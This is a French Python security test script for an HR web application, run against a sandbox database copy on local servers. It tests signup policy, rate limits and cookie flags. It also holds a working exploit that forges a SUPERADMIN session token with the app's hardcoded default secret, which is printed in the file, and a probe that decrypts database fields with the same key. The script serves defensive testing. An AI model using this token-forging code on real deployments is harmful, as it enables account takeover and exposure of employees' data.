#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Tests dynamiques DESTRUCTIFS de sécurité — Auto-RH 0.2.24
Bac à sable isolé : copie de la base, serveurs jetables 4310 (admin) / 4311 (portail).
AUCUNE donnée réelle modifiée : les écritures vont dans la COPIE de la base.
"""
import hashlib
import json
import os
import shutil
import signal
import subprocess
import sys
import time
import urllib.request
import urllib.error

PROJET = "/home/z/my-project"
SDB = os.path.join(PROJET, "sandbox-securite", "sandbox-run")
PORT_ADMIN = 4310
PORT_PORTAIL = 4311
BASE_A = "http://127.0.0.1:%d" % PORT_ADMIN
BASE_P = "http://127.0.0.1:%d" % PORT_PORTAIL
# Conditions IDENTIQUES à l'instance en marche : AUCUNE AUTH_SECRET fournie
# -> le serveur retombe sur la clé par défaut codée en dur (src/lib/auth.ts).
SECRET_PAR_DEFAUT = "autorh-secret-local-a-changer-dans-env"
CODE_FORT = "Sandbox-Test24!a"   # 14 car, 4 classes
CODE_FAIBLE = "Abcdef12"         # 8 car, PAS de symbole -> politique refuse
resultats = []


def check(nom, ok, detail=""):
    resultats.append((nom, ok, detail))
    print(("PASS " if ok else "FAIL ") + nom + (" — " + detail if detail else ""), flush=True)


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


opener = urllib.request.build_opener(NoRedirect)


def req(url, method="GET", data=None, cookies=None, timeout=20):
    h = {}
    if cookies:
        h["Cookie"] = cookies
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with opener.open(r, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return 0, {}, str(e).encode()


def hash_code(code):
    """Réplique hashSignupCode : canon = trim().toUpperCase(), scrypt 64."""
    canon = code.strip().upper()
    salt = os.urandom(16).hex()
    out = subprocess.run(
        ["node", "-e",
         "const c=require('crypto');const canon=process.argv[1];"
         "const salt=process.argv[2];"
         "console.log('scrypt:'+salt+':'+c.scryptSync(canon,salt,64).toString('hex'));",
         canon, salt],
        capture_output=True, text=True, cwd=PROJET, timeout=60)
    return out.stdout.strip()


def id_premier_utilisateur(db_path):
    """Lit l'ID du premier utilisateur de la COPIE sandbox (jamais l'email/nom)."""
    out = subprocess.run(
        ["node", "-e",
         "const {PrismaClient}=require(process.argv[1]+'/node_modules/.prisma/client');"
         "const p=new PrismaClient({datasources:{db:{url:'file:'+process.argv[2]}}});"
         "(async()=>{const u=await p.user.findFirst();await p.$disconnect();"
         "console.log(u?u.id:'AUCUN');})().catch(e=>console.log('ERREUR'));",
         PROJET, db_path],
        capture_output=True, text=True, timeout=60, cwd=PROJET)
    return out.stdout.strip()


def lire_env_reel():
    """Vérifie l'ABSENCE d'AUTH_SECRET dans .env réel (conditions de l'instance)."""
    secret = None
    with open(os.path.join(PROJET, ".env"), "r") as f:
        for line in f:
            m = line.strip()
            if m.startswith("AUTH_SECRET="):
                secret = m.split("=", 1)[1].strip()
    return secret  # None = conditions identiques à l'instance en marche (fallback)


def attendre_pret(url, tries=40):
    for _ in range(tries):
        st, _, _ = req(url, timeout=5)
        if st in (200, 307, 302, 401, 405):
            return True
        time.sleep(0.5)
    return False


def tuer_port(port):
    try:
        out = subprocess.run(["bash", "-c",
                              "ss -ltnp 2>/dev/null | grep ':%d ' | grep -o 'pid=[0-9]*' | cut -d= -f2 | sort -u" % port],
                             capture_output=True, text=True)
        for pid in out.stdout.split():
            try:
                os.kill(int(pid), signal.SIGKILL)
            except Exception:
                pass
    except Exception:
        pass
    time.sleep(0.8)


def demarrer_admin(hash_code_env, log):
    env = dict(os.environ)
    env.update({
        "PORT": str(PORT_ADMIN),
        "HOSTNAME": "127.0.0.1",
        "DATABASE_URL": "file:" + os.path.join(SDB, "db", "custom.db"),
        "SIGNUP_CODE_HASH": hash_code_env,
        "SIGNUP_ENABLED": "true",
        "NODE_ENV": "production",
    })
    env.pop("AUTH_SECRET", None)  # conditions identiques à l'instance en marche
    logf = open(log, "ab")
    p = subprocess.Popen(["node", os.path.join(PROJET, ".next", "standalone", "server.js")],
                         cwd=PROJET, env=env, stdout=logf, stderr=subprocess.STDOUT)
    ok = attendre_pret(BASE_A + "/login")
    return p, ok


def demarrer_portail(log):
    env = dict(os.environ)
    env.update({
        "PORTAL_PORT": str(PORT_PORTAIL),
        "HOSTNAME": "127.0.0.1",
        "DATABASE_URL": "file:" + os.path.join(SDB, "db", "custom.db"),
        "NODE_ENV": "production",
    })
    env.pop("AUTH_SECRET", None)
    logf = open(log, "ab")
    p = subprocess.Popen(["node", os.path.join(SDB, "scripts", "portail-server.js")],
                         cwd=SDB, env=env, stdout=logf, stderr=subprocess.STDOUT)
    ok = attendre_pret(BASE_P + "/api/health")
    return p, ok


def forge_token_admin(secret, user_id="secu-forged-0001", email="forge@test.local",
                      name="Forge Test", role="SUPERADMIN", exp_offset=3600):
    """Forge un jeton de session admin avec une clé CONNUE (réplique createSessionToken)."""
    import base64
    import hmac as hmac_mod
    payload = {"id": user_id, "email": email, "name": name, "role": role,
               "exp": int(time.time()) + exp_offset}
    body = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
    # Node base64url sans padding = même encodage que Buffer.toString('base64url')
    sig = hmac_mod.new(secret.encode(), body.encode(), hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip("=")
    return body + "." + sig_b64


# ==================================================================
# 0) PRÉPARATION DU BAC À SABLE
# ==================================================================
print("== Préparation du bac à sable ==", flush=True)
AUTH_SECRET = lire_env_reel()
assert AUTH_SECRET is None, "AUTH_SECRET présente : conditions différentes de l'instance"
tuer_port(PORT_ADMIN)
tuer_port(PORT_PORTAIL)
shutil.rmtree(SDB, ignore_errors=True)
os.makedirs(os.path.join(SDB, "db"), exist_ok=True)
os.makedirs(os.path.join(SDB, "scripts"), exist_ok=True)
shutil.copy2(os.path.join(PROJET, "db", "custom.db"), os.path.join(SDB, "db", "custom.db"))
for f in os.listdir(os.path.join(PROJET, "sandbox-securite", "extracted", "scripts")):
    if f.endswith(".js"):
        shutil.copy2(os.path.join(PROJET, "sandbox-securite", "extracted", "scripts", f),
                     os.path.join(SDB, "scripts", f))
print("Bac à sable prêt (copie DB + scripts ZIP 0.2.24)", flush=True)

# ==================================================================
# PHASE 1 — code d'activation FAIBLE configuré -> politique avant comparaison
# ==================================================================
print("\n== PHASE 1 : code faible configuré (%s) ==" % CODE_FAIBLE, flush=True)
h_faible = hash_code(CODE_FAIBLE)
admin1, ok = demarrer_admin(h_faible, os.path.join(PROJET, "sandbox-securite", "serveur-admin.log"))
assert ok, "serveur admin phase 1 non prêt"

st, hd, bd = req(BASE_A + "/api/auth/signup", "POST",
                 {"name": "Test Secu", "email": "secu-faible@test.local",
                  "password": "MotSecu24!x", "role": "RH", "code": CODE_FAIBLE})
try:
    j = json.loads(bd.decode())
    msg = j.get("error", "")
except Exception:
    msg = bd[:80].decode("utf-8", "replace")
check("T1: code FAIBLE mais CORRECT -> 403 politique (pas de comparaison)",
      st == 403 and ("symbole" in msg.lower() or "8 caractères" in msg.lower()), "%s %s" % (st, msg[:90]))

tuer_port(PORT_ADMIN)

# ==================================================================
# PHASE 2 — code FORT : forging session (clé par défaut), succès, 429 signup
# ==================================================================
print("\n== PHASE 2 : code fort + forge de session (clé par défaut) ==", flush=True)
h_fort = hash_code(CODE_FORT)
admin2, ok = demarrer_admin(h_fort, os.path.join(PROJET, "sandbox-securite", "serveur-admin.log"))
assert ok, "serveur admin phase 2 non prêt"

# T1 : EXPLOIT — session admin forgée avec la clé PAR DÉFAUT (connue du ZIP public)
# 1) id INVENTÉ : doit être rejeté par la revalidation base (compte inexistant)
token_invente = forge_token_admin(SECRET_PAR_DEFAUT)
st, _, _ = req(BASE_A + "/api/users", cookies="auto_rh_session=" + token_invente)
check("T1a: token forgé id INVENTÉ -> rejeté par revalidation base (401)",
      st == 401, "GET /api/users -> %s" % st)
# 2) id RÉEL (lu dans la copie sandbox, jamais affiché) : signature par défaut acceptée ?
uid = id_premier_utilisateur(os.path.join(SDB, "db", "custom.db"))
assert uid not in ("AUCUN", "ERREUR", ""), "pas d'utilisateur dans la copie"
token_reel = forge_token_admin(SECRET_PAR_DEFAUT, user_id=uid)
st, hd, bd = req(BASE_A + "/api/users", cookies="auto_rh_session=" + token_reel)
check("T1b-EXPLOIT: token forgé avec id RÉEL + clé PAR DÉFAUT -> ACCÈS ADMIN",
      st == 200, "GET /api/users -> %s (%d octets, contenu NON affiché, id masqué)" % (st, len(bd)))
st2, _, _ = req(BASE_A + "/api/portal-access", cookies="auto_rh_session=" + token_reel)
check("T1c-EXPLOIT bis: /api/portal-access accessible avec le même token forgé",
      st2 == 200, "-> %s" % st2)

# T2 : création de compte conforme -> 201 + flags du cookie de session
st, hd, bd = req(BASE_A + "/api/auth/signup", "POST",
                 {"name": "Test Secu", "email": "secu-ok@test.local",
                  "password": "MotSecu24!x", "role": "RH", "code": CODE_FORT})
sc = hd.get("set-cookie", hd.get("Set-Cookie", "")) or ""
flags_ok = ("httponly" in sc.lower()) and ("samesite=lax" in sc.lower())
check("T2: inscription conforme -> 201 + cookie HttpOnly SameSite=Lax",
      st == 201 and flags_ok, "%s, flags HttpOnly=%s SameSiteLax=%s" % (
          st, "httponly" in sc.lower(), "samesite=lax" in sc.lower()))

# T3 : mots de passe faibles -> 400 avec message PRÉCIS par classe manquante
cas_faibles = [
    ("court8", "Ab1!xyz", "8 caractères"),
    ("sans_maj", "abcdef1!x", "majuscule"),
    ("sans_min", "ABCDEF1!X", "minuscule"),
    ("sans_chiffre", "Abcdefg!h", "chiffre"),
    ("sans_symbole", "Abcdefg1h", "symbole"),
]
for label, mdp, attendu in cas_faibles:
    st, hd, bd = req(BASE_A + "/api/auth/signup", "POST",
                     {"name": "Test Secu", "email": "secu-%s@test.local" % label,
                      "password": mdp, "role": "RH", "code": CODE_FORT})
    try:
        msg = json.loads(bd.decode()).get("error", "")
    except Exception:
        msg = ""
    basse = msg.lower()
    check("T3-%s: mot de passe '%s' -> 400 message '%s'" % (label, mdp, attendu),
          st == 400 and attendu.lower() in basse, "%s %s" % (st, msg[:80]))

# T4 : login SANS limiteur (constat) — 25 échecs, tous 401 sans 429
codes_4xx = []
for _ in range(25):
    st, _, _ = req(BASE_A + "/api/auth/login", "POST",
                   {"email": "inexistant-secu@test.local", "password": "NestPasTrouve1!"})
    codes_4xx.append(st)
nb_429 = codes_4xx.count(429)
nb_401 = codes_4xx.count(401)
check("T4: constat — 25 échecs login : 0 blocage (429 absent)", nb_429 == 0 and nb_401 == 25,
      "401×%d, 429×%d" % (nb_401, nb_429))

# T5 : anti force-brute signup — 21 codes CONFORMES mais ERRONÉS -> 20×403 puis 429
st_suite = []
for _ in range(21):
    st, _, _ = req(BASE_A + "/api/auth/signup", "POST",
                   {"name": "Test Secu", "email": "secu-bf@test.local",
                    "password": "MotSecu24!x", "role": "RH", "code": "Mauvais-Code-99!z"})
    st_suite.append(st)
check("T5: 21 codes erronés CONFORMES -> blocage 429 après 20 (fenêtre 10 min)",
      st_suite[:20] == [403] * 20 and st_suite[20] == 429,
      "403×%d puis %s" % (st_suite.count(403), st_suite[20]))

tuer_port(PORT_ADMIN)

# ==================================================================
# PHASE 3 — portail : limiteur /api/verify (15/min/IP)
# ==================================================================
print("\n== PHASE 3 : portail (limiteur /api/verify) ==", flush=True)
portail, ok = demarrer_portail(os.path.join(PROJET, "sandbox-securite", "serveur-portail.log"))
assert ok, "portail bac à sable non prêt"

st_suite = []
for i in range(18):
    st, _, _ = req(BASE_P + "/api/verify", "POST",
                   {"cin": "SECUINEXISTANT%03d" % i, "password": "NestPasTrouve1!"})
    st_suite.append(st)
nb_429 = st_suite.count(429)
check("T6: 18 CIN inexistants -> 429 dès la 16e requête (15/min/IP)",
      nb_429 >= 3 and st_suite[14] != 429 and all(s == 429 for s in st_suite[15:]),
      str(st_suite))

st, _, _ = req(BASE_P + "/api/premiere", "POST",
               {"cin": "SECUINEXISTANT999", "nouveauMotDePasse": "MotSecu24!x"})
check("T7: /api/premiere CIN inconnu -> refus propre", st in (400, 401, 403, 404), str(st))

tuer_port(PORT_PORTAIL)

# ==================================================================
# PHASE 4 — preuve chiffrement base avec clé dérivée de la chaîne PAR DÉFAUT
# ==================================================================
print("\n== PHASE 3 : chiffrement base — clé dérivée du secret par défaut ==", flush=True)
probe = subprocess.run(
    ["node", "-e",
     "const lib=require(process.argv[1]+'/sandbox-securite/extracted/scripts/lib-crypto-bd.js');"
     "const {PrismaClient}=require(process.argv[1]+'/node_modules/.prisma/client');"
     "const p=new PrismaClient({datasources:{db:{url:'file:'+process.argv[2]}}});"
     "(async()=>{const u=await p.user.findFirst();await p.$disconnect();"
     "if(!u){console.log('PAS_D_UTILISATEUR');return;}"
     "const nom=lib.dechiffrerChamp(u.name);"
     "console.log('DECHIFFRE_OK:'+Buffer.from(String(nom||'')).length+'octets');"
     "})().catch(e=>console.log('ECHEC:'+e.message.slice(0,80)));",
     PROJET, os.path.join(SDB, "db", "custom.db")],
    capture_output=True, text=True, timeout=90, cwd=PROJET)
sortie = (probe.stdout + probe.stderr).strip().splitlines()[-1] if (probe.stdout + probe.stderr).strip() else "?"
check("T9: champs chiffrés de la base déchiffrables avec la clé PAR DÉFAUT publique",
      sortie.startswith("DECHIFFRE_OK"), sortie[:100] + " (valeur NON affichée)")

tuer_port(PORT_PORTAIL)

# ==================================================================
# NETTOYAGE + RÉSUMÉ
# ==================================================================
shutil.rmtree(SDB, ignore_errors=True)
nb_ok = sum(1 for _, okk, _ in resultats if okk)
print("\nTOTAL DESTRUCTIF: %d/%d PASS" % (nb_ok, len(resultats)), flush=True)
with open(os.path.join(PROJET, "sandbox-securite", "resultats-destructifs.txt"), "w") as f:
    for nom, okk, detail in resultats:
        f.write(("%s | %s | %s\n" % ("PASS" if okk else "FAIL", nom, detail)))
sys.exit(0 if nb_ok == len(resultats) else 1)
